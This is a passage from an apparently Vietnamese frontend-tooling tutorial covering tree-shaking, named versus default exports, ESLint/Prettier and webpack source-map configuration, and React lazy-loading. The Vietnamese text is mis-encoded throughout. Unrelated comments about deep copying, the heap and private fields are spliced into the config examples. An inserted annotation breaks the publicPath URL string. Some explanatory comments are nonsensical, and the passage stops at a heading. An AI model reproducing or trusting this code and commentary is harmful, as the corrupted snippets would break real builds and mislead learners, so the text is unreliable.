console.log('Logger initialized'); // Ch√∫ gi·∫£i: ‚ö†Ô∏è Side-effect: console.log khi import
window.logger = { log: (msg) => console.log(msg) }; // Ch√∫ gi·∫£i: ‚ö†Ô∏è Modify global

export function log(message) {
  console.log(message);
}

 // Ch√∫ gi·∫£i: App import logger:
import { log } from './logger.js';
// ‚Üí logger.js ƒë∆∞·ª£c execute ngay l·∫≠p t·ª©c
 // Ch√∫ gi·∫£i: ‚Üí console.log('Logger initialized') ch·∫°y
// ‚Üí window.logger ƒë∆∞·ª£c t·∫°o
// ‚Üí Bundler KH√îNG D√ÅM x√≥a code n√†y (v√¨ c√≥ side-effects)

// ‚úÖ Code KH√îNG c√≥ side-effects (tree shake ƒë∆∞·ª£c):
 // Ch√∫ gi·∫£i: math.js
export function add(a, b) {
  return a + b; // ‚úÖ Pure function - kh√¥ng side-effects
}

 // Ch√∫ gi·∫£i: ===================================================
// ‚úÖ Y√äU C·∫¶U 3: Named Exports (kh√¥ng d√πng default export)
 // Ch√∫ gi·∫£i: ===================================================

// ‚ùå BAD: Default export + destructuring ‚Üí Tree shake K√âM
 // Ch√∫ gi·∫£i: utils.js
export default {
  add: (a, b) => a + b,
  subtract: (a, b) => a - b,
  multiply: (a, b) => a * b,
};

 // Ch√∫ gi·∫£i: app.js
import utils from './utils.js';
const result = utils.add(1, 2);
// üö® Bundler ph·∫£i include TO√ÄN B·ªò object (v√¨ kh√¥ng bi·∫øt property n√†o ƒë∆∞·ª£c d√πng)

 // Ch√∫ gi·∫£i: ‚úÖ GOOD: Named exports ‚Üí Tree shake T·ªêT
 // Ch√∫ gi·∫£i: utils.js
export const add = (a, b) => a + b;
export const subtract = (a, b) => a - b;
export const multiply = (a, b) => a * b;

 // Ch√∫ gi·∫£i: app.js
import { add } from './utils.js';
const result = add(1, 2);
// ‚úÖ Bundler ch·ªâ include add, lo·∫°i b·ªè subtract v√† multiply

 // Ch√∫ gi·∫£i: ===================================================
 // Ch√∫ gi·∫£i: ‚ùå ANTI-PATTERN: Barrel Exports (Re-exports)
 // Ch√∫ gi·∫£i: ===================================================

 // Ch√∫ gi·∫£i: ‚ùå BAD: Barrel file (index.js) re-export t·∫•t c·∫£
 // Ch√∫ gi·∫£i: index.js
export * from './moduleA'; // Ch√∫ gi·∫£i: Re-export t·∫•t c·∫£ t·ª´ moduleA
export * from './moduleB';
export * from './moduleC';

 // Ch√∫ gi·∫£i: app.js
import { funcA } from './index.js'; // Ch√∫ gi·∫£i: Import t·ª´ barrel
 // Ch√∫ gi·∫£i: üö® Bundler ph·∫£i load T·∫§T C·∫¢ modules (A, B, C)
// V√¨ barrel file c√≥ th·ªÉ c√≥ side-effects

// ‚úÖ GOOD: Import tr·ª±c ti·∫øp
import { funcA } from './moduleA.js';
// ‚úÖ Ch·ªâ load moduleA, kh√¥ng load B v√† C
```

**üéØ Real-World Tree Shaking Example:**

```typescript
 // Ch√∫ gi·∫£i: ===================================================
// üì¶ V√ç D·ª§ TH·ª∞C T·∫æ: Lodash Library
 // Ch√∫ gi·∫£i: ===================================================

// ‚ùå BAD: Import to√†n b·ªô Lodash (~70 KB!)
import _ from 'lodash';

const result = _.uniq([1, 2, 2, 3]);
// üö® Bundle bao g·ªìm TO√ÄN B·ªò Lodash (300+ functions)
 // Ch√∫ gi·∫£i: ‚Üí Bundle size: +70 KB

// ‚úÖ GOOD: Import ch·ªâ function c·∫ßn d√πng
import uniq from 'lodash/uniq'; // Ch√∫ gi·∫£i: Ch·ªâ import uniq function

const result = uniq([1, 2, 2, 3]);
 // Ch√∫ gi·∫£i: ‚úÖ Bundle ch·ªâ bao g·ªìm uniq function (~2 KB)
 // Ch√∫ gi·∫£i: ‚Üí Bundle size: +2 KB

// üìä Ti·∫øt ki·ªám: 68 KB! (97% nh·ªè h∆°n)

// ‚úÖ BETTER: D√πng lodash-es (ES Modules version)
import { uniq } from 'lodash-es';
// ‚Üí Tree shaking t·ª± ƒë·ªông lo·∫°i b·ªè functions kh√¥ng d√πng
```

---

**üìö Ph·∫ßn 4: Code Splitting, ESLint/Prettier, Source Maps**

C√°c c√¥ng c·ª• quan tr·ªçng trong frontend development:

1. **ESLint/Prettier** - Code Quality & Formatting

   - **ESLint**: Linter - ph√°t hi·ªán l·ªói, enforce coding standards
   - **Prettier**: Formatter - format code t·ª± ƒë·ªông, gi·ªØ style nh·∫•t qu√°n
   - **T√≠ch h·ª£p**: ESLint check logic + Prettier format code

2. **Source Maps** - Debugging

   - Map t·ª´ minified/transpiled code ‚Üí original source code
   - Debug trong browser nh∆∞ code g·ªëc (tr∆∞·ªõc build)
   - Xem line numbers, variable names ch√≠nh x√°c

3. **Code Splitting** - Performance Optimization
   - Chia bundle th√†nh nhi·ªÅu chunks nh·ªè
   - Load code khi c·∫ßn (lazy loading)
   - C·∫£i thi·ªán initial load time

**Ho·∫°t ƒë·ªông:**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ              COMPLETE TOOLING WORKFLOW                      ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                             ‚îÇ
‚îÇ  1. DEVELOPMENT (ESLint + Prettier)                        ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                  ‚îÇ
‚îÇ  ‚îÇ  Write modern code (ES2020+, TS)    ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ    ‚Üì                                 ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  ESLint check (errors, warnings)    ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ    ‚Üì                                 ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  Prettier format (auto-fix)         ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ    ‚Üì                                 ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  Clean, consistent code ‚úÖ           ‚îÇ                  ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                  ‚îÇ
‚îÇ                                                             ‚îÇ
‚îÇ  2. BUILD PROCESS (Full Pipeline)                         ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                  ‚îÇ
‚îÇ  ‚îÇ  Source: 100 files, 500 KB, ES2020  ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ    ‚Üì                                 ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  TRANSPILING (Babel/TypeScript)     ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - ES2020 ‚Üí ES5 (arrow fn ‚Üí fn)    ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - TypeScript ‚Üí JavaScript          ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - JSX ‚Üí JavaScript                 ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ    ‚Üì                                 ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  POLYFILLING (core-js)              ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - Add Promise, fetch, Array.from   ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - Only import used polyfills       ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ    ‚Üì                                 ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  Transpiled: 100 files, 550 KB, ES5‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ    ‚Üì                                 ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  BUNDLING (Webpack/Vite)            ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - G·ªôp 100 files ‚Üí 1 file           ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - Resolve dependencies             ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ    ‚Üì                                 ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  Bundle: 1 file, 550 KB             ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ    ‚Üì                                 ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  TREE-SHAKING (Remove dead code)   ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - Analyze imports/exports          ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - Remove unused functions          ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ    ‚Üì                                 ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  Optimized: 1 file, 300 KB ‚úÖ       ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ    ‚Üì                                 ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  MINIFY (Terser/esbuild)            ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - Remove whitespace, comments      ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - Shorten variable names           ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ    ‚Üì                                 ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  Minified: 1 file, 100 KB ‚úÖ        ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ    ‚Üì                                 ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  CODE SPLITTING (Dynamic imports)   ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - Split by routes/components       ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - Vendor chunk (React, libs...)    ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ    ‚Üì                                 ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  Final Output:                       ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - main.js (30KB) - App logic       ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - vendor.js (40KB) - Libraries     ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - lazy-1.js (15KB) - Route 1       ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - lazy-2.js (15KB) - Route 2       ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  Total: 100KB (split into 4 chunks)‚îÇ                  ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                  ‚îÇ
‚îÇ                                                             ‚îÇ
‚îÇ  3. PRODUCTION (Source Maps + Differential Serving)       ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                  ‚îÇ
‚îÇ  ‚îÇ  Modern browsers:                    ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - Load modern.js (ES2020, 80KB)    ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - No polyfills needed              ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ    ‚Üì                                 ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  Old browsers (IE11):               ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - Load legacy.js (ES5, 100KB)     ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - Includes polyfills               ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ    ‚Üì                                 ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  Debug v·ªõi Source Maps:             ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - app.min.js + app.min.js.map     ‚îÇ                  ‚îÇ
‚îÇ  ‚îÇ  - DevTools shows original code ‚úÖ   ‚îÇ                  ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                  ‚îÇ
‚îÇ                                                             ‚îÇ
‚îÇ  üìä OPTIMIZATION RESULTS:                                  ‚îÇ
‚îÇ  - Original: 500 KB (ES2020, 100 files, readable)        ‚îÇ
‚îÇ  - Modern: 80 KB (ES2020, minified, split) - 84% smaller ‚îÇ
‚îÇ  - Legacy: 100 KB (ES5, polyfills, split) - 80% smaller  ‚îÇ
‚îÇ  - Initial load: 30 KB main.js - 94% smaller! üöÄ         ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**∆Øu ƒëi·ªÉm:**

- ‚úÖ **Bundling**: 100 requests ‚Üí 1 request, gi·∫£m latency 100x
- ‚úÖ **Minify**: Gi·∫£m 60-70% k√≠ch th∆∞·ªõc file (850KB ‚Üí 280KB)
- ‚úÖ **Tree-shaking**: Lo·∫°i b·ªè dead code, gi·∫£m 30-50% bundle size
- ‚úÖ **Polyfill**: D√πng modern features tr√™n old browsers (IE11)
- ‚úÖ **Transpiling**: Vi·∫øt ES2020+, deploy ES5 (backward compatible)
- ‚úÖ **ESLint**: Catch bugs s·ªõm, enforce best practices
- ‚úÖ **Prettier**: Kh√¥ng tranh c√£i v·ªÅ code style, t·ª± ƒë·ªông format
- ‚úÖ **Source Maps**: Debug d·ªÖ d√†ng nh∆∞ development mode
- ‚úÖ **Code Splitting**: Initial load nhanh h∆°n, better UX
- ‚úÖ **Differential Serving**: Modern browsers t·∫£i 66% √≠t h∆°n

**Nh∆∞·ª£c ƒëi·ªÉm:**

- ‚ùå **Bundling**: Build time ch·∫≠m h∆°n (ph·∫£i g·ªôp files)
- ‚ùå **Minify**: Code kh√≥ ƒë·ªçc (c·∫ßn source maps ƒë·ªÉ debug)
- ‚ùå **Tree-shaking**: Kh√¥ng ho·∫°t ƒë·ªông v·ªõi CommonJS, side-effects
- ‚ùå **Polyfill**: TƒÉng bundle size (core-js ~90KB n·∫øu import all)
- ‚ùå **Transpiling**: Code d√†i h∆°n (arrow fn ‚Üí function declaration)
- ‚ùå **ESLint**: C·∫•u h√¨nh ph·ª©c t·∫°p, rules conflict
- ‚ùå **Prettier**: ƒê√¥i khi format kh√¥ng nh∆∞ √Ω mu·ªën
- ‚ùå **Source Maps**: File .map tƒÉng bandwidth (n√™n serve ri√™ng)
- ‚ùå **Code Splitting**: Ph·ª©c t·∫°p h∆°n, nhi·ªÅu HTTP requests

**Ch√∫ th√≠ch:**

**üì¶ Bundling Best Practices:**

- **Webpack**: Bundler ph·ªï bi·∫øn nh·∫•t, nhi·ªÅu features
- **Vite**: Bundler m·ªõi, c·ª±c nhanh (d√πng esbuild)
- **Rollup**: T·ªët cho libraries (tree-shaking xu·∫•t s·∫Øc)

**üóúÔ∏è Minify Tools:**

- **Terser**: Minifier t·ªët nh·∫•t cho JavaScript (default trong Webpack 5)
- **esbuild**: C·ª±c nhanh (Golang), d√πng trong Vite
- **UglifyJS**: C≈© h∆°n, ch·∫≠m h∆°n (deprecated)

**üå≤ Tree-shaking Tips:**

- **Y√™u c·∫ßu**: ESM (`import/export`), kh√¥ng d√πng CommonJS (`require`)
- **`sideEffects: false`**: B√°o cho bundler bi·∫øt "safe to remove unused exports"
- **Side-effects**: Code c√≥ t√°c d·ª•ng ph·ª• (global variables, CSS imports, polyfills...)

**üîß Polyfill Best Practices:**

- **core-js**: Comprehensive polyfill library (500+ polyfills)
- **polyfill.io**: Dynamic polyfill service (auto-detect browser)
- **Strategy**: Import only needed polyfills (`import 'core-js/features/array/includes'`)
- **Avoid**: Import all polyfills (`import 'core-js'` ‚Üí +90KB!)

**üîÑ Transpiling Best Practices:**

- **Babel**: Industry standard transpiler (ES6+ ‚Üí ES5)
- **@babel/preset-env**: Auto-detect transforms needed based on targets
- **TypeScript**: Type checking + transpiling (slower than Babel)
- **Best**: TypeScript (type check) + Babel (transpile)
- **Differential Serving**: Modern bundle (ES2020) + Legacy bundle (ES5)

**üîç ESLint vs Prettier:**

- **ESLint**: T·∫≠p trung v√†o **logic** (unused vars, missing return, potential bugs...)
- **Prettier**: T·∫≠p trung v√†o **formatting** (spaces, quotes, line breaks...)
- **T√≠ch h·ª£p**: `eslint-config-prettier` t·∫Øt ESLint formatting rules ‚Üí kh√¥ng conflict

**üó∫Ô∏è Source Maps:**

- Development: `devtool: 'eval-source-map'` (fast rebuild)
- Production: `devtool: 'source-map'` (separate .map file)
- **Hidden source maps**: Deploy .map ri√™ng, kh√¥ng public ‚Üí b·∫£o m·∫≠t source code

**‚úÇÔ∏è Code Splitting:**

- **Route-based**: Split theo routes (React Router, Vue Router)
- **Component-based**: Lazy load components n·∫∑ng (React.lazy, Vue defineAsyncComponent)
- **Vendor splitting**: T√°ch libraries (React, Lodash...) ra vendor chunk

---

**Code Example (TypeScript):**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 1. ESLint + Prettier Configuration
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: .eslintrc.js
module.exports = {
  root: true,
  parser: '@typescript-eslint/parser',
  parserOptions: {
    ecmaVersion: 2022,
    sourceType: 'module',
    project: './tsconfig.json'
  },
  plugins: ['@typescript-eslint', 'react', 'react-hooks'],
  extends: [
    'eslint:recommended', // Ch√∫ gi·∫£i: ESLint base rules
    'plugin:@typescript-eslint/recommended', // Ch√∫ gi·∫£i: TypeScript rules
    'plugin:react/recommended', // Ch√∫ gi·∫£i: React rules
    'plugin:react-hooks/recommended', // Ch√∫ gi·∫£i: React Hooks rules
    'prettier' // Ch√∫ gi·∫£i: Disable formatting rules (conflict v·ªõi Prettier)
  ],
  rules: {
 // Ch√∫ gi·∫£i: Customize rules
    '@typescript-eslint/no-unused-vars': 'error',  // ‚ùå Error khi c√≥ unused vars
    '@typescript-eslint/explicit-function-return-type': 'warn', // ‚ö†Ô∏è Warning khi kh√¥ng c√≥ return type
    'react/prop-types': 'off',                     // ‚úÖ T·∫Øt (v√¨ d√πng TypeScript)
    'no-console': 'warn', // Ch√∫ gi·∫£i: ‚ö†Ô∏è Warning v·ªõi console.log
  }
};

 // Ch√∫ gi·∫£i: .prettierrc.js
module.exports = {
  semi: true,                    // Th√™m semicolon
  singleQuote: true,             // D√πng single quotes
  tabWidth: 2, // Ch√∫ gi·∫£i: 2 spaces
  trailingComma: 'es5', // Ch√∫ gi·∫£i: Trailing comma cho ES5
  printWidth: 100, // Ch√∫ gi·∫£i: Max line length
  arrowParens: 'avoid',          // (x) => x thay v√¨ (x) => x
  endOfLine: 'lf' // Ch√∫ gi·∫£i: Unix line endings
};

 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
{
  "scripts": {
    "lint": "eslint . --ext .ts,.tsx", // Ch√∫ gi·∫£i: Check l·ªói
    "lint:fix": "eslint . --ext .ts,.tsx --fix", // Ch√∫ gi·∫£i: Auto-fix l·ªói
    "format": "prettier --write \"**/*.{ts,tsx,json}\"", // Ch√∫ gi·∫£i: Format code
    "format:check": "prettier --check \"**/*.{ts,tsx,json}\"" // Ch√∫ gi·∫£i: Check format
  }
}

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 2. Source Maps Configuration
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: webpack.config.js
module.exports = {
  mode: 'production',

 // Ch√∫ gi·∫£i: üó∫Ô∏è Source maps cho production
  devtool: 'source-map', // T·∫°o file .map ri√™ng

 // Ch√∫ gi·∫£i: Alternative options:
  // devtool: 'hidden-source-map' ‚Üí Kh√¥ng reference trong bundle (b·∫£o m·∫≠t h∆°n)
 // Ch√∫ gi·∫£i: devtool: 'eval-source-map'   ‚Üí Development (rebuild nhanh)
 // Heap l∆∞u object v√† m·∫£ng; ƒë∆∞·ª£c runtime qu·∫£n l√Ω b·ªüi tr√¨nh thu gom r√°c.

  output: {
    filename: '[name].[contenthash].js',
    path: path.resolve(__dirname, 'dist'),

 // Tr∆∞·ªùng private (v√≠ d·ª• `#field`) ch·ªâ truy c·∫≠p ƒë∆∞·ª£c trong class, kh√¥ng th·ªÉ truy c·∫≠p t·ª´ b√™n ngo√†i.
    sourceMapFilename: '[file].map',
    publicPath: 'https: // Ch√∫ gi·∫£i: sourcemaps.example.com/'
  }
};

 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
{
  "compilerOptions": {
    "sourceMap": true, // Ch√∫ gi·∫£i: Generate .map files cho TypeScript
    "inlineSources": true // Ch√∫ gi·∫£i: Include source code trong .map (debugging easier)
  }
}

 // Ch√∫ gi·∫£i: üéØ S·ª≠ d·ª•ng: Debug trong browser
 // Ch√∫ gi·∫£i: 1. Open DevTools
// 2. Source maps t·ª± ƒë·ªông load
 // Ch√∫ gi·∫£i: 3. Set breakpoint trong ORIGINAL TypeScript code
// 4. Xem variables v·ªõi original names (kh√¥ng b·ªã minified)

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 3. Tree-shaking Setup
 // Ch√∫ gi·∫£i: ============================================

 // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
{
  "name": "my-app",
  "sideEffects": false, // ‚úÖ B√°o cho bundler: "safe to remove unused exports"

  // Ho·∫∑c specify files c√≥ side-effects:
 // Ch√∫ gi·∫£i: "sideEffects": ["*.css", "*.scss", "./src/polyfills.ts"]
}

 // Ch√∫ gi·∫£i: ‚úÖ GOOD: Named exports cho tree-shaking
 // Ch√∫ gi·∫£i: utils.ts
export function add(a: number, b: number): number {
  return a + b;
}

export function subtract(a: number, b: number): number {
  return a - b;
}

export function multiply(a: number, b: number): number {
  return a * b;
}

 // Ch√∫ gi·∫£i: app.ts
import { add } from './utils'; // Ch√∫ gi·∫£i: ‚úÖ Ch·ªâ import add

console.log(add(2, 3));

 // Ch√∫ gi·∫£i: üå≤ Tree-shaking result:
// subtract() v√† multiply() B·ªä LO·∫†I B·ªé kh·ªèi bundle!
 // Ch√∫ gi·∫£i: Bundle ch·ªâ ch·ª©a add() ‚Üí nh·ªè h∆°n

// ‚ùå BAD: Default export + namespace import ‚Üí tree-shaking K√âM
 // Ch√∫ gi·∫£i: utils.ts
export default {
  add: (a, b) => a + b,
  subtract: (a, b) => a - b,
  multiply: (a, b) => a * b
};

 // Ch√∫ gi·∫£i: app.ts
import utils from './utils'; // Ch√∫ gi·∫£i: ‚ùå Import C·∫¢ object
console.log(utils.add(2, 3));
// üö® Tree-shaking KH√îNG ho·∫°t ƒë·ªông!
// Bundle ch·ª©a c·∫£ subtract, multiply (d√π kh√¥ng d√πng)

 // Ch√∫ gi·∫£i: ‚ùå BAD: Barrel exports v·ªõi side-effects
 // Ch√∫ gi·∫£i: index.ts (barrel file)
export * from './moduleA'; // ‚ùå N·∫øu moduleA c√≥ side-effects
export * from './moduleB';
export * from './moduleC';

 // Ch√∫ gi·∫£i: app.ts
import { funcA } from './index'; // Ch√∫ gi·∫£i: Import from barrel
 // Ch√∫ gi·∫£i: üö® Bundler ph·∫£i load T·∫§T C·∫¢ modules (A, B, C)
// V√¨ kh√¥ng bi·∫øt module n√†o c√≥ side-effects

// ‚úÖ GOOD: Import tr·ª±c ti·∫øp
import { funcA } from './moduleA'; // Ch√∫ gi·∫£i: ‚úÖ Ch·ªâ load moduleA

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 4. Code Splitting
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: üìç A. Route-based Code Splitting (React Router)
import { lazy, Suspense } from 'react';
import { BrowserRouter, Routes, Route } from 'react-router-dom';

 // Ch√∫ gi·∫£i: ‚úÖ Lazy load route components
const Home = lazy(() => import('./pages/Home')); // Ch√∫ gi·∫£i: home.chunk.js
const Dashboard = lazy(() => import('./pages/Dashboard')); // Ch√∫ gi·∫£i: dashboard.chunk.js
const Profile = lazy(() => import('./pages/Profile')); // Ch√∫ gi·∫£i: profile.chunk.js

function App() {
  return (
    <BrowserRouter>
      <Suspense fallback={<div>Loading...</div>}>
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/dashboard" element={<Dashboard />} />
          <Route path="/profile" element={<Profile />} />
        </Routes>
      </Suspense>
    </BrowserRouter>
  );
}

// üéØ K·∫øt qu·∫£:
 // Ch√∫ gi·∫£i: - Initial load: Ch·ªâ load main.js + home.chunk.js
// - User v√†o /dashboard ‚Üí Load dashboard.chunk.js on-demand
// - User v√†o /profile ‚Üí Load profile.chunk.js on-demand

 // Ch√∫ gi·∫£i: üì¶ B. Component-based Code Splitting
 // Ch√∫ gi·∫£i: Heavy component (Chart library)
const ChartComponent = lazy(() => import('./components/Chart'));

function Dashboard() {
  const [showChart, setShowChart] = React.useState(false);

  return (
    <div>
      <button onClick={() => setShowChart(true)}>Show Chart</button>

      {showChart && (
        <Suspense fallback={<div>Loading chart...</div>}>
          <ChartComponent /> {/* Load khi click button */}
        </Suspense>
      )}
    </div>
  );
}

// üéØ L·ª£i √≠ch: Chart library (VD: 500KB) ch·ªâ load khi user click

 // Ch√∫ gi·∫£i: üîß C. Dynamic Import (Vanilla JS)
async function loadHeavyModule() {
  const module = await import('./heavy-module'); // Ch√∫ gi·∫£i: Load on-demand
  module.doSomething();
}

 // Ch√∫ gi·∫£i: Example: Load trading calculator khi c·∫ßn
document.getElementById('calculate-btn')?.addEventListener('click', async () => {
 // Ch√∫ gi·∫£i: Load calculator module (ch·ª©a complex math logic)
  const { calculateProfit } = await import('./trading-calculator');

  const result = calculateProfit(100, 150);
  console.log(result);
});

 // Ch√∫ gi·∫£i: üìä D. Vendor Splitting (Webpack)
 // Ch√∫ gi·∫£i: webpack.config.js
